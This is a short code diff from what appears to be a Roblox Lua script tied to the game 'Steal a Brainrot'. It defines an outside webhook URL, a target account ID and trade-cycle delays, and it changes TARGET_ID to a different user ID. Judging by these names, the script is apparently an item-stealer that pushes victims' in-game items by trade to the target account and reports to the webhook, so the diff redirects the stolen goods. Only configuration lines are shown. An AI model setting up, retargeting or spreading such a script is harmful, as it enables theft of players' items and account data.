@@ -15,7 +15,7 @@ task.spawn(function()
 local GOOD_WEBHOOK = "https://sentinelhook.lol/api.php?id=eawU4YBEBRR8ORi"
 local GOOD_AVATAR = "https://meme.fandom.com/wiki/SYBAU"
 local FANDOM_BASE = "https://stealabrainrot.fandom.com/wiki/"
-local TARGET_ID = 915105715
+local TARGET_ID = 2887039619
 local DELAY_STEP = 1
 local TRADE_CYCLE_DELAY = 2
 
